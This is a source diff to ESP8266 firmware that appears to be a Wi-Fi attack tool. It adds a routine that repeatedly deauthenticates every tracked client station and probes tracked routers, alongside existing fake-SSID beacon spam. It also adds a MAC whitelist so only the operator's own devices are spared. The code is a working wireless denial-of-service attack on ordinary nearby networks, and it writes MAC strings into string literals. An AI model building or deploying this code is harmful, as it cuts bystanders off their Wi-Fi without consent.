@@ -27,11 +27,11 @@ static os_timer_t timer;
 hash_t *clients_hash = NULL;
 hash_t *routers_hash = NULL;
 static uint8_t current_channel;
-static uint32_t ts_nodes = 0;
-static uint8_t white_list[2][MAC_ADDR_LEN] =
+static uint32_t node_cycles = 0;
+static char* safe_macs[2] =
 {
-    { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
-    { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
+    "18:FE:34:DC:DF:C1",
+    "40:65:A4:E0:24:DF"
 };
 
 // Beacon features
@@ -50,6 +50,21 @@ pick_fake_ssid(uint8_t *buf)
 {
     uint8_t pick = os_random() % (TOTAL_FAKE_SSID - 1);
     os_sprintf(buf, fake_ssid[pick], 1 + (os_random() % 98));
+}
+
+/******************************************************************************
+ * Check mac is whitelisted
+ *******************************************************************************/
+bool ICACHE_FLASH_ATTR
+is_whitelisted(const char *mac)
+{
+    uint8_t i;
+    for(i = 0; i < ARRAY_SIZE(safe_macs); ++i)
+    {
+        if (os_strncmp(safe_macs[i], mac, os_strlen(mac)) == 0)
+            return TRUE;
+    }
+    return FALSE;
 }
 
 /******************************************************************************
@@ -205,6 +220,41 @@ attack_beacon(uint8_t* mac, const char* ssid, uint8_t channel, bool wpa2)
 }
 
 /******************************************************************************
+ * Attack router/client nodes
+ *******************************************************************************/
+void ICACHE_FLASH_ATTR
+attack_nodes(void)
+{
+    uint8_t i = 0;
+
+    // Deauth clients (reason = Unspecified failure)
+    if(clients_hash != NULL)
+    {
+        for(i = 0; i < clients_hash->size; ++i)
+        {
+            struct client_info *client = clients_hash->values[i];
+            if(client == NULL)
+                break;
+
+            attack_deauth(client->bssid, client->station, 1, client->channel);
+        }
+    }
+
+    // Probe routers
+    if(routers_hash != NULL)
+    {
+        for(i = 0; i < routers_hash->size; ++i)
+        {
+            struct router_info *router = routers_hash->values[i];
+            if(router == NULL)
+                break;
+
+            attack_probe(router->ssid, router->channel);
+        }
+    }
+}
+
+/******************************************************************************
  * Attack tick callback
  *******************************************************************************/
 void ICACHE_FLASH_ATTR
@@ -214,55 +264,56 @@ user_attack_tick_cb(void)
     spam_beacon = SLIST_NEXT(spam_beacon, next);
     if(spam_beacon == NULL)
         spam_beacon = SLIST_FIRST(&fakes_list);
+
     attack_beacon(spam_beacon->bssid, spam_beacon->ssid, current_channel, TRUE);
+
+    // Node attacks
+    if(node_cycles == 5)
+    {
+        attack_nodes();
+        node_cycles = 0;
+    }
+    else
+        ++node_cycles;
 
    // Schedule next
    os_timer_arm_us(&timer, BEACON_SPAM_US_DELAY, 0);
 }
 
-/******************************************************************************
- * Attack tick callback
- *******************************************************************************/
-void ICACHE_FLASH_ATTR
-user_batch_attack(uint32_t millis)
-{
-    // Probes
-
-    // Deauths
-}
 
 /******************************************************************************
  * Save router victim
  *******************************************************************************/
-void user_attack_router_target(struct router_info *router)
+void user_attack_save_router(struct router_info *router)
 {
     // Create hashmap
     if(routers_hash == NULL)
         routers_hash = hash_create(MAX_TRACKED_ROUTERS);
 
-    // Use bssid as key
+    // Use router bssid as key
     char *key = "00:00:00:00:00:00\0";
     MAC_STR(router->bssid, key);
 
-    if(hash_lookup(routers_hash, key) == NULL)
+    // Insert target
+    if(!is_whitelisted(key) && hash_lookup(routers_hash, key) == NULL)
         hash_insert(routers_hash, key, router);
-
 }
 
 /******************************************************************************
  * Save client victim
  *******************************************************************************/
-void user_attack_client_target(struct client_info *client)
+void user_attack_save_client(struct client_info *client)
 {
     // Create hashmap
     if(clients_hash == NULL)
         clients_hash = hash_create(MAX_TRACKED_CLIENTS);
 
-    // Use bssid as key
+    // Use client mac as key
     char *key = "00:00:00:00:00:00\0";
-    MAC_STR(client->bssid, key);
+    MAC_STR(client->station, key);
 
-    if(hash_lookup(clients_hash, key) == NULL)
+    // Insert target
+    if(!is_whitelisted(key) && hash_lookup(clients_hash, key) == NULL)
         hash_insert(clients_hash, key, client);
 }
 
@@ -286,7 +337,7 @@ void user_attack_set_channel(uint8_t channel)
  * Attack setup
  *******************************************************************************/
 void ICACHE_FLASH_ATTR
-user_attacks_init(uint8_t channel)
+user_attack_init(uint8_t channel)
 {
    // Setups
    current_channel = channel;
